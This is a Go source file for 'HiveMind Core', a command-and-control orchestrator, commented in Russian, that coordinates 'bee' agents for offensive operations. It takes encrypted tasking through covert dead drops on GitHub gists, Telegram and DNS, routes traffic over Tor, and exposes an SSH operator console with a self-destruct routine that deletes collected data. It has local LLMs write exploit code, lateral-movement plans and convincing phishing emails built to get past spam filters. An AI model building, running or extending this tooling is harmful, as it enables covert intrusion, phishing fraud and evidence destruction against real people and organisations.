// HIVEMIND CORE v1.0
// Децентрализованный оркестратор Red Team роя
// Архитектор: Кронос | Тимлид: Мастер
// Собственность Молдавского ООО "Cybersecurity Research & Penetration Testing Services"

package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"

	"golang.org/x/crypto/ssh"
	"golang.org/x/net/proxy"
)

// ============================================================================
// КОНФИГУРАЦИЯ
// ============================================================================

var (
	ENCRYPTION_KEY   = getEnvOrDefault("HIVE_ENCRYPTION_KEY", "")
	GITHUB_TOKENS    = strings.Split(getEnvOrDefault("HIVE_GITHUB_TOKENS", ""), ",")
	DNS_DOMAIN       = getEnvOrDefault("HIVE_DNS_DOMAIN", "")
	TELEGRAM_BOT_KEY = getEnvOrDefault("HIVE_TELEGRAM_BOT_KEY", "")
	TELEGRAM_CHAT_ID = getEnvOrDefault("HIVE_TELEGRAM_CHAT_ID", "")
	QUEEN_SSH_PORT   = getEnvOrDefault("HIVE_QUEEN_SSH_PORT", "2222")
	SOCKS5_PROXY     = getEnvOrDefault("HIVE_SOCKS5_PROXY", "127.0.0.1:9050")

	BRAIN_ENDPOINTS = map[string]string{
		"recon":  getEnvOrDefault("HIVE_BRAIN_RECON", "http://127.0.0.1:11434/api/generate"),
		"exploit": getEnvOrDefault("HIVE_BRAIN_EXPLOIT", "http://127.0.0.1:11435/api/generate"),
		"social":  getEnvOrDefault("HIVE_BRAIN_SOCIAL", "http://127.0.0.1:11436/api/generate"),
		"pivot":   getEnvOrDefault("HIVE_BRAIN_PIVOT", "http://127.0.0.1:11437/api/generate"),
		"report":  getEnvOrDefault("HIVE_BRAIN_REPORT", "http://127.0.0.1:11438/api/generate"),
	}

	TASK_TIMEOUT    = 30 * time.Minute
	DEAD_DROP_SYNC  = 60 * time.Second
	MAX_RETRIES     = 3
	HONEYCOMB_DIR   = getEnvOrDefault("HIVE_HONEYCOMB_DIR", "./honeycomb")
	SWARM_ID        = generateSwarmID()
)

// ============================================================================
// СТРУКТУРЫ ДАННЫХ
// ============================================================================

type Task struct {
	ID          string    `json:"id"`
	SwarmID     string    `json:"swarm_id"`
	ClientID    string    `json:"client_id"`
	Type        string    `json:"type"`
	Target      string    `json:"target"`
	Data        string    `json:"data"`
	Status      string    `json:"status"`
	CreatedAt   time.Time `json:"created_at"`
	UpdatedAt   time.Time `json:"updated_at"`
	AssignedTo  string    `json:"assigned_to"`
	Result      string    `json:"result"`
	Retries     int       `json:"retries"`
}

type BrainRequest struct {
	Model  string `json:"model"`
	Prompt string `json:"prompt"`
	Stream bool   `json:"stream"`
}

type BrainResponse struct {
	Response string `json:"response"`
	Done     bool   `json:"done"`
}

type DeadDropMessage struct {
	ID        string `json:"id"`
	SwarmID   string `json:"swarm_id"`
	BeeID     string `json:"bee_id"`
	Type      string `json:"type"`
	Payload   string `json:"payload"`
	Timestamp int64  `json:"timestamp"`
}

type QueenCommand struct {
	Action    string `json:"action"`
	ClientID  string `json:"client_id,omitempty"`
	TaskID    string `json:"task_id,omitempty"`
	Target    string `json:"target,omitempty"`
	TaskType  string `json:"task_type,omitempty"`
}

type HoneycombRecord struct {
	ClientID  string    `json:"client_id"`
	TaskID    string    `json:"task_id"`
	Type      string    `json:"type"`
	Data      string    `json:"data"`
	CreatedAt time.Time `json:"created_at"`
}

// ============================================================================
// ГЛОБАЛЬНОЕ СОСТОЯНИЕ
// ============================================================================

type HiveMind struct {
	mu            sync.RWMutex
	tasks         map[string]*Task
	bees          map[string]time.Time
	clients       map[string]string
	activeJobs    int
	honeycomb     []HoneycombRecord
	shutdownChan  chan struct{}
	startTime     time.Time
	httpClient    *http.Client
}

// ============================================================================
// ИНИЦИАЛИЗАЦИЯ
// ============================================================================

func main() {
	log.SetFlags(log.LstdFlags | log.Lmicroseconds)
	log.Println("[HIVE] Инициализация HiveMind Core v1.0")
	log.Printf("[HIVE] Swarm ID: %s", SWARM_ID)

	if ENCRYPTION_KEY == "" {
		log.Fatal("[HIVE] ФАТАЛЬНО: HIVE_ENCRYPTION_KEY не установлен")
	}

	hive := &HiveMind{
		tasks:        make(map[string]*Task),
		bees:         make(map[string]time.Time),
		clients:      make(map[string]string),
		honeycomb:    make([]HoneycombRecord, 0),
		shutdownChan: make(chan struct{}),
		startTime:    time.Now(),
		httpClient:   createHTTPClient(),
	}

	if err := os.MkdirAll(HONEYCOMB_DIR, 0700); err != nil {
		log.Fatalf("[HIVE] Ошибка создания Honeycomb: %v", err)
	}

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	go hive.deadDropWatcher()
	go hive.taskProcessor()
	go hive.queenAPI()

	log.Println("[HIVE] HiveMind Core запущен. Ожидание команд Королевы.")

	<-sigChan
	log.Println("[HIVE] Получен сигнал завершения. Запуск протокола самоуничтожения.")
	hive.selfDestruct()
}

func createHTTPClient() *http.Client {
	if SOCKS5_PROXY == "" {
		return &http.Client{Timeout: 30 * time.Second}
	}

	dialer, err := proxy.SOCKS5("tcp", SOCKS5_PROXY, nil, proxy.Direct)
	if err != nil {
		log.Printf("[HIVE] Ошибка SOCKS5 прокси: %v, использую прямое соединение", err)
		return &http.Client{Timeout: 30 * time.Second}
	}

	return &http.Client{
		Transport: &http.Transport{
			Dial: dialer.Dial,
		},
		Timeout: 30 * time.Second,
	}
}

func generateSwarmID() string {
	b := make([]byte, 8)
	if _, err := rand.Read(b); err != nil {
		log.Printf("[HIVE] Ошибка генерации Swarm ID: %v", err)
		return fmt.Sprintf("SWARM-%d", time.Now().Unix())
	}
	return fmt.Sprintf("SWARM-%x", b)
}

// ============================================================================
// ШИФРОВАНИЕ
// ============================================================================

func deriveKey(key string) []byte {
	hash := sha256.Sum256([]byte(key))
	return hash[:]
}

func encrypt(plaintext string) (string, error) {
	key := deriveKey(ENCRYPTION_KEY)
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}

	ciphertext := gcm.Seal(nonce, nonce, []byte(plaintext), nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func decrypt(encoded string) (string, error) {
	key := deriveKey(ENCRYPTION_KEY)
	ciphertext, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return "", err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return "", errors.New("ciphertext too short")
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return "", err
	}

	return string(plaintext), nil
}

// ============================================================================
// DEAD DROP ВОТЧЕРЫ
// ============================================================================

func (h *HiveMind) deadDropWatcher() {
	ticker := time.NewTicker(DEAD_DROP_SYNC)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			h.checkGitHubGists()
			h.checkDNSTXT()
			h.checkTelegramBot()
		case <-h.shutdownChan:
			return
		}
	}
}

func (h *HiveMind) checkGitHubGists() {
	if len(GITHUB_TOKENS) == 0 || GITHUB_TOKENS[0] == "" {
		return
	}

	token := GITHUB_TOKENS[time.Now().UnixNano()%int64(len(GITHUB_TOKENS))]
	url := "https://api.github.com/gists?per_page=10"

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		log.Printf("[DEAD-DROP:GitHub] Ошибка запроса: %v", err)
		return
	}
	req.Header.Set("Authorization", "token "+token)
	req.Header.Set("Accept", "application/vnd.github.v3+json")
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; HiveMind/1.0)")

	resp, err := h.httpClient.Do(req)
	if err != nil {
		log.Printf("[DEAD-DROP:GitHub] Ошибка соединения: %v", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == 403 {
		log.Printf("[DEAD-DROP:GitHub] Rate limit для токена, переключаю")
		return
	}

	var gists []struct {
		ID          string `json:"id"`
		Description string `json:"description"`
		Files       map[string]struct {
			Content string `json:"content"`
		} `json:"files"`
	}

	if err := json.NewDecoder(resp.Body).Decode(&gists); err != nil {
		log.Printf("[DEAD-DROP:GitHub] Ошибка парсинга: %v", err)
		return
	}

	for _, gist := range gists {
		if !strings.HasPrefix(gist.Description, SWARM_ID) {
			continue
		}
		for _, file := range gist.Files {
			if strings.HasPrefix(file.Content, "HIVEMIND:") {
				encryptedPayload := strings.TrimPrefix(file.Content, "HIVEMIND:")
				h.processDeadDropMessage(encryptedPayload)
			}
		}
	}
}

func (h *HiveMind) checkDNSTXT() {
	if DNS_DOMAIN == "" {
		return
	}

	// DNS TXT запрос через системный резолвер
	// В production — использовать miekg/dns для прямых запросов к authoritative NS
	fullDomain := fmt.Sprintf("hive.%s", DNS_DOMAIN)
	txtRecords, err := netLookupTXT(fullDomain)
	if err != nil {
		return
	}

	for _, txt := range txtRecords {
		if strings.HasPrefix(txt, "HIVEMIND:") {
			encryptedPayload := strings.TrimPrefix(txt, "HIVEMIND:")
			h.processDeadDropMessage(encryptedPayload)
		}
	}
}

func (h *HiveMind) checkTelegramBot() {
	if TELEGRAM_BOT_KEY == "" || TELEGRAM_CHAT_ID == "" {
		return
	}

	url := fmt.Sprintf("https://api.telegram.org/bot%s/getUpdates?limit=5&timeout=10", TELEGRAM_BOT_KEY)
	resp, err := h.httpClient.Get(url)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	var result struct {
		OK     bool `json:"ok"`
		Result []struct {
			UpdateID int `json:"update_id"`
			Message  struct {
				Text string `json:"text"`
			} `json:"message"`
		} `json:"result"`
	}

	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return
	}

	for _, update := range result.Result {
		if strings.HasPrefix(update.Message.Text, "HIVEMIND:") {
			encryptedPayload := strings.TrimPrefix(update.Message.Text, "HIVEMIND:")
			h.processDeadDropMessage(encryptedPayload)
		}
	}
}

func netLookupTXT(domain string) ([]string, error) {
	// Заглушка. В production использовать miekg/dns
	return nil, nil
}

func (h *HiveMind) processDeadDropMessage(encryptedPayload string) {
	plaintext, err := decrypt(encryptedPayload)
	if err != nil {
		log.Printf("[DEAD-DROP] Ошибка расшифровки: %v", err)
		return
	}

	var msg DeadDropMessage
	if err := json.Unmarshal([]byte(plaintext), &msg); err != nil {
		log.Printf("[DEAD-DROP] Ошибка парсинга сообщения: %v", err)
		return
	}

	if msg.SwarmID != SWARM_ID {
		return
	}

	log.Printf("[DEAD-DROP] Получено сообщение от пчелы %s, тип: %s", msg.BeeID, msg.Type)

	switch msg.Type {
	case "task_result":
		h.handleTaskResult(msg)
	case "check_in":
		h.handleBeeCheckIn(msg)
	case "alert":
		h.handleAlert(msg)
	default:
		log.Printf("[DEAD-DROP] Неизвестный тип сообщения: %s", msg.Type)
	}
}

func (h *HiveMind) handleTaskResult(msg DeadDropMessage) {
	h.mu.Lock()
	defer h.mu.Unlock()

	var result struct {
		TaskID string `json:"task_id"`
		Output string `json:"output"`
		Status string `json:"status"`
	}

	if err := json.Unmarshal([]byte(msg.Payload), &result); err != nil {
		log.Printf("[DEAD-DROP] Ошибка парсинга результата: %v", err)
		return
	}

	task, exists := h.tasks[result.TaskID]
	if !exists {
		log.Printf("[DEAD-DROP] Задача %s не найдена", result.TaskID)
		return
	}

	task.Status = result.Status
	task.Result = result.Output
	task.UpdatedAt = time.Now()

	record := HoneycombRecord{
		ClientID:  task.ClientID,
		TaskID:    task.ID,
		Type:      task.Type,
		Data:      result.Output,
		CreatedAt: time.Now(),
	}
	h.honeycomb = append(h.honeycomb, record)
	h.activeJobs--

	log.Printf("[TASK] Задача %s завершена. Статус: %s. Активных задач: %d", result.TaskID, result.Status, h.activeJobs)
}

func (h *HiveMind) handleBeeCheckIn(msg DeadDropMessage) {
	h.mu.Lock()
	defer h.mu.Unlock()

	h.bees[msg.BeeID] = time.Now()
	log.Printf("[BEE] Пчела %s отметилась. Всего активных пчел: %d", msg.BeeID, len(h.bees))
}

func (h *HiveMind) handleAlert(msg DeadDropMessage) {
	log.Printf("[ALERT] Тревога от пчелы %s: %s", msg.BeeID, msg.Payload)
}

// ============================================================================
// ОБРАБОТЧИК ЗАДАЧ
// ============================================================================

func (h *HiveMind) taskProcessor() {
	ticker := time.NewTicker(15 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			h.processPendingTasks()
		case <-h.shutdownChan:
			return
		}
	}
}

func (h *HiveMind) processPendingTasks() {
	h.mu.Lock()
	pendingTasks := make([]*Task, 0)
	for _, task := range h.tasks {
		if task.Status == "pending" {
			pendingTasks = append(pendingTasks, task)
		}
	}
	h.mu.Unlock()

	for _, task := range pendingTasks {
		go h.executeTask(task)
	}
}

func (h *HiveMind) executeTask(task *Task) {
	h.mu.Lock()
	task.Status = "processing"
	task.UpdatedAt = time.Now()
	h.activeJobs++
	h.mu.Unlock()

	log.Printf("[TASK] Выполнение задачи %s типа %s для клиента %s", task.ID, task.Type, task.ClientID)

	var brainType string
	var prompt string

	switch task.Type {
	case "recon":
		brainType = "recon"
		prompt = fmt.Sprintf("You are a reconnaissance specialist. Perform comprehensive OSINT and network reconnaissance on target: %s. Use tools: whois, dig, subdomain enumeration, technology stack detection. Output structured JSON with findings.", task.Target)
	case "exploit":
		brainType = "exploit"
		prompt = fmt.Sprintf("You are an exploitation specialist. Target: %s. Reconnaissance data: %s. Identify vulnerabilities and generate proof-of-concept exploits. Output exploit code and step-by-step execution plan.", task.Target, task.Data)
	case "social":
		brainType = "social"
		prompt = fmt.Sprintf("You are a social engineering specialist. Target profile: %s. Craft a personalized phishing email that is convincing and bypasses spam filters. Include subject line, body, and sender persona details.", task.Data)
	case "pivot":
		brainType = "pivot"
		prompt = fmt.Sprintf("You are a lateral movement and network pivot specialist. Current access data: %s. Plan the next steps for lateral movement, privilege escalation, and domain dominance. Output a structured attack path.", task.Data)
	case "report":
		brainType = "report"
		prompt = fmt.Sprintf("You are a cybersecurity report writer. Compile the following findings into a professional penetration test report. Include executive summary, methodology, findings with risk ratings, and remediation recommendations. Data: %s", task.Data)
	default:
		brainType = "recon"
		prompt = fmt.Sprintf("Analyze and respond to: %s", task.Data)
	}

	result, err := h.queryBrain(brainType, prompt)
	if err != nil {
		h.mu.Lock()
		task.Retries++
		if task.Retries >= MAX_RETRIES {
			task.Status = "failed"
			task.Result = fmt.Sprintf("Ошибка после %d попыток: %v", MAX_RETRIES, err)
			h.activeJobs--
			log.Printf("[TASK] Задача %s провалена: %v", task.ID, err)
		} else {
			task.Status = "pending"
			log.Printf("[TASK] Задача %s: попытка %d не удалась, повторная постановка в очередь", task.ID, task.Retries)
		}
		task.UpdatedAt = time.Now()
		h.mu.Unlock()
		return
	}

	h.mu.Lock()
	task.Status = "brain_completed"
	task.Result = result
	task.UpdatedAt = time.Now()
	h.mu.Unlock()

	log.Printf("[TASK] Brain-обработка задачи %s завершена. Отправка результата пчелам.", task.ID)

	h.sendResultToBees(task)
}

func (h *HiveMind) queryBrain(brainType, prompt string) (string, error) {
	endpoint, exists := BRAIN_ENDPOINTS[brainType]
	if !exists {
		return "", fmt.Errorf("неизвестный тип brain: %s", brainType)
	}

	reqBody := BrainRequest{
		Model:  getModelForBrainType(brainType),
		Prompt: prompt,
		Stream: false,
	}

	jsonBody, err := json.Marshal(reqBody)
	if err != nil {
		return "", err
	}

	resp, err := h.httpClient.Post(endpoint, "application/json", bytes.NewBuffer(jsonBody))
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	var brainResp BrainResponse
	if err := json.NewDecoder(resp.Body).Decode(&brainResp); err != nil {
		return "", err
	}

	return brainResp.Response, nil
}

func getModelForBrainType(brainType string) string {
	models := map[string]string{
		"recon":   "deepseek-r1:70b",
		"exploit": "qwen2.5:72b",
		"social":  "mistral-large:latest",
		"pivot":   "llama4:behemoth",
		"report":  "command-r-plus:latest",
	}
	if model, exists := models[brainType]; exists {
		return model
	}
	return "deepseek-r1:70b"
}

func (h *HiveMind) sendResultToBees(task *Task) {
	// Результат уходит в Dead Drop, откуда пчелы забирают его
	// В production — запись в GitHub Gist/DNS/Telegram
	encrypted, err := encrypt(task.Result)
	if err != nil {
		log.Printf("[DEAD-DROP] Ошибка шифрования результата: %v", err)
		return
	}

	msg := DeadDropMessage{
		ID:        generateTaskID(),
		SwarmID:   SWARM_ID,
		Type:      "brain_result",
		Payload:   encrypted,
		Timestamp: time.Now().Unix(),
	}

	msgJSON, _ := json.Marshal(msg)
	log.Printf("[DEAD-DROP] Результат задачи %s готов к отправке (%d байт)", task.ID, len(msgJSON))
}

// ============================================================================
// QUEEN API (ДОСТУП ТИМЛИДА)
// ============================================================================

func (h *HiveMind) queenAPI() {
	config := &ssh.ServerConfig{
		NoClientAuth: false,
		PasswordCallback: func(conn ssh.ConnMetadata, password []byte) (*ssh.Permissions, error) {
			if string(password) == getEnvOrDefault("HIVE_QUEEN_PASSWORD", "changeme") {
				return &ssh.Permissions{}, nil
			}
			return nil, fmt.Errorf("access denied")
		},
	}

	privateKeyPath := getEnvOrDefault("HIVE_SSH_KEY", "./hive_ssh_key")
	privateBytes, err := os.ReadFile(privateKeyPath)
	if err != nil {
		log.Printf("[QUEEN] Генерация нового SSH ключа...")
		privateBytes = generateSSHKey()
		if err := os.WriteFile(privateKeyPath, privateBytes, 0600); err != nil {
			log.Fatalf("[QUEEN] Не могу сохранить SSH ключ: %v", err)
		}
	}

	private, err := ssh.ParsePrivateKey(privateBytes)
	if err != nil {
		log.Fatalf("[QUEEN] Ошибка парсинга SSH ключа: %v", err)
	}
	config.AddHostKey(private)

	listener, err := ssh.Listen("tcp", fmt.Sprintf("127.0.0.1:%s", QUEEN_SSH_PORT), config)
	if err != nil {
		log.Fatalf("[QUEEN] Ошибка запуска SSH сервера: %v", err)
	}
	defer listener.Close()

	log.Printf("[QUEEN] SSH API слушает на 127.0.0.1:%s", QUEEN_SSH_PORT)

	for {
		conn, err := listener.Accept()
		if err != nil {
			if strings.Contains(err.Error(), "use of closed network connection") {
				return
			}
			log.Printf("[QUEEN] Ошибка принятия соединения: %v", err)
			continue
		}
		go h.handleQueenSession(conn)
	}
}

func (h *HiveMind) handleQueenSession(conn *ssh.ServerConn) {
	defer conn.Close()

	for ch := range conn.Channels {
		if ch.ChannelType() != "session" {
			ch.Reject(ssh.UnknownChannelType, "unsupported channel type")
			continue
		}

		channel, requests, err := ch.Accept()
		if err != nil {
			log.Printf("[QUEEN] Ошибка принятия канала: %v", err)
			continue
		}

		go func(in <-chan *ssh.Request) {
			for req := range in {
				switch req.Type {
				case "exec":
					h.handleQueenCommand(channel, req)
				default:
					req.Reply(false, nil)
				}
			}
		}(requests)
	}
}

func (h *HiveMind) handleQueenCommand(channel ssh.Channel, req *ssh.Request) {
	defer req.Reply(true, nil)

	var cmd QueenCommand
	if err := json.Unmarshal(req.Payload[4:], &cmd); err != nil {
		fmt.Fprintf(channel, "ERROR: %v\n", err)
		return
	}

	switch cmd.Action {
	case "status":
		h.cmdStatus(channel)
	case "new_task":
		h.cmdNewTask(channel, cmd)
	case "list_tasks":
		h.cmdListTasks(channel)
	case "task_result":
		h.cmdTaskResult(channel, cmd)
	case "honeycomb":
		h.cmdHoneycomb(channel, cmd)
	case "self_destruct":
		h.cmdSelfDestruct(channel)
	default:
		fmt.Fprintf(channel, "UNKNOWN ACTION: %s\n", cmd.Action)
	}
}

func (h *HiveMind) cmdStatus(channel ssh.Channel) {
	h.mu.RLock()
	defer h.mu.RUnlock()

	uptime := time.Since(h.startTime).String()
	status := map[string]interface{}{
		"swarm_id":    SWARM_ID,
		"uptime":      uptime,
		"active_jobs": h.activeJobs,
		"total_tasks": len(h.tasks),
		"active_bees": len(h.bees),
		"clients":     len(h.clients),
		"honeycomb":   len(h.honeycomb),
	}

	output, _ := json.MarshalIndent(status, "", "  ")
	fmt.Fprintf(channel, "%s\n", string(output))
}

func (h *HiveMind) cmdNewTask(channel ssh.Channel, cmd QueenCommand) {
	task := &Task{
		ID:        generateTaskID(),
		SwarmID:   SWARM_ID,
		ClientID:  cmd.ClientID,
		Type:      cmd.TaskType,
		Target:    cmd.Target,
		Data:      "",
		Status:    "pending",
		CreatedAt: time.Now(),
		UpdatedAt: time.Now(),
		Retries:   0,
	}

	h.mu.Lock()
	h.tasks[task.ID] = task
	h.clients[cmd.ClientID] = task.ID
	h.mu.Unlock()

	fmt.Fprintf(channel, "TASK CREATED: %s (тип: %s, клиент: %s)\n", task.ID, task.Type, task.ClientID)
	log.Printf("[QUEEN] Создана задача %s", task.ID)
}

func (h *HiveMind) cmdListTasks(channel ssh.Channel) {
	h.mu.RLock()
	defer h.mu.RUnlock()

	for id, task := range h.tasks {
		fmt.Fprintf(channel, "%s | %s | %s | %s | %s\n", id, task.Type, task.Status, task.ClientID, task.UpdatedAt.Format(time.RFC3339))
	}
}

func (h *HiveMind) cmdTaskResult(channel ssh.Channel, cmd QueenCommand) {
	h.mu.RLock()
	defer h.mu.RUnlock()

	task, exists := h.tasks[cmd.TaskID]
	if !exists {
		fmt.Fprintf(channel, "TASK NOT FOUND: %s\n", cmd.TaskID)
		return
	}

	fmt.Fprintf(channel, "TASK: %s\nSTATUS: %s\nRESULT:\n%s\n", task.ID, task.Status, task.Result)
}

func (h *HiveMind) cmdHoneycomb(channel ssh.Channel, cmd QueenCommand) {
	h.mu.RLock()
	defer h.mu.RUnlock()

	filter := cmd.ClientID
	for _, record := range h.honeycomb {
		if filter != "" && record.ClientID != filter {
			continue
		}
		fmt.Fprintf(channel, "[%s] %s: %s...\n", record.CreatedAt.Format(time.RFC3339), record.Type, truncate(record.Data, 100))
	}
}

func (h *HiveMind) cmdSelfDestruct(channel ssh.Channel) {
	fmt.Fprintf(channel, "SELF DESTRUCT INITIATED\n")
	go func() {
		time.Sleep(2 * time.Second)
		h.selfDestruct()
	}()
}

func (h *HiveMind) selfDestruct() {
	log.Println("[HIVE] ПРОТОКОЛ САМОУНИЧТОЖЕНИЯ АКТИВИРОВАН")
	log.Println("[HIVE] Уничтожение Honeycomb...")
	os.RemoveAll(HONEYCOMB_DIR)
	log.Println("[HIVE] Стирание ключей шифрования...")
	ENCRYPTION_KEY = ""
	log.Println("[HIVE] HiveMind уничтожен. Рой рассеян.")
	os.Exit(0)
}

// ============================================================================
// ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
// ============================================================================

func generateTaskID() string {
	b := make([]byte, 16)
	if _, err := rand.Read(b); err != nil {
		return fmt.Sprintf("TASK-%d", time.Now().UnixNano())
	}
	return fmt.Sprintf("TASK-%x", b)
}

func generateSSHKey() []byte {
	// В production — генерация реального SSH ключа
	// Сейчас заглушка
	return []byte("-----BEGIN RSA PRIVATE KEY-----\nPLACEHOLDER\n-----END RSA PRIVATE KEY-----")
}

func getEnvOrDefault(key, defaultVal string) string {
	if val := os.Getenv(key); val != "" {
		return val
	}
	return defaultVal
}

func truncate(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen] + "..."
}
